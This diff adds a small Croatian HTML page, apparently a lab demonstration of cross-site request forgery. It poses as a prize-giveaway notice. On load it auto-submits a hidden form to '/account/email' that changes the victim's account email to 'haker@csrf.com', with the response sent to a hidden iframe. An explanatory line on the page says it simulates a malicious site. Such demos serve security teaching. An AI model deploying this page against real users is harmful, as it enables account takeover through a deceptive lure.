@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="hr">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Nagradna igra</title>
+    <style>
+      body {
+        font-family: "Segoe UI", system-ui, Arial, sans-serif;
+        font-size: 15px;
+        line-height: 1.55;
+        color: #1a1a1a;
+        max-width: 520px;
+        margin: 60px auto;
+        padding: 0 24px;
+      }
+      .box {
+        border: 1px solid #ddd;
+        padding: 24px;
+      }
+      h1 {
+        font-size: 1.2rem;
+        margin: 0 0 10px;
+      }
+      button {
+        padding: 8px 16px;
+        border: 1px solid #1a1a1a;
+        background: #1a1a1a;
+        color: #fff;
+        cursor: pointer;
+        font: inherit;
+      }
+      .note {
+        margin-top: 22px;
+        font-size: 0.85rem;
+        color: #666;
+      }
+      code {
+        background: #f0f0f0;
+        padding: 1px 5px;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="box">
+      <h1>Cestitamo, osvojili ste nagradu!</h1>
+      <p>Kliknite za preuzimanje nagradnog bona.</p>
+      <form
+        id="napad"
+        method="post"
+        action="/account/email"
+        target="nevidljivi"
+      >
+        <input type="hidden" name="email" value="haker@csrf.com" />
+        <button type="submit">Preuzmi nagradu</button>
+      </form>
+    </div>
+
+    <iframe name="nevidljivi" style="display: none"></iframe>
+
+    <p class="note">
+      Objasnjenje: ova stranica simulira zlonamjerno sjediste. Pri ucitavanju
+      automatski salje krivotvoreni zahtjev za promjenu e-maila racuna zrtve na
+      <code>haker@csrf.com</code>. Vratite se na pocetnu stranicu aplikacije i
+      osvjezite ju da vidis ucinak.
+    </p>
+
+    <script>
+      window.addEventListener("load", function () {
+        document.getElementById("napad").submit();
+      });
+    </script>
+  </body>
+</html>
